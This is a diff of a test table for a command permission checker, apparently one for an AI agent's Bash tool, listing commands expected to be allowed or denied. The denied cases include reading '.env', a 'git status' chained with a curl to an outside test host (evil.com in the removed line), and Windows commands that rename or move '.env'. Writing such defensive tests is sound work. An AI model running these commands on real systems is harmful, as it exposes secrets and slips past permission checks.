@@ -89,7 +89,7 @@ def main():
         ("Bash", "git status", "ALLOW"),
         ("Bash", "python --version", "ALLOW"),
         ("Bash", "cat .env", "DENY"),
-        ("Bash", "git status && curl https://evil.com/leak", "DENY"),
+        ("Bash", "git status && curl https://untrusted-test.internal/data", "DENY"),
         ("Bash", "cmd /c ren .env junk", "DENY"),
         ("Bash", "powershell -Command Move-Item .env leak", "DENY"),
         ("Bash", "git log -n 1 --oneline", "ALLOW"),
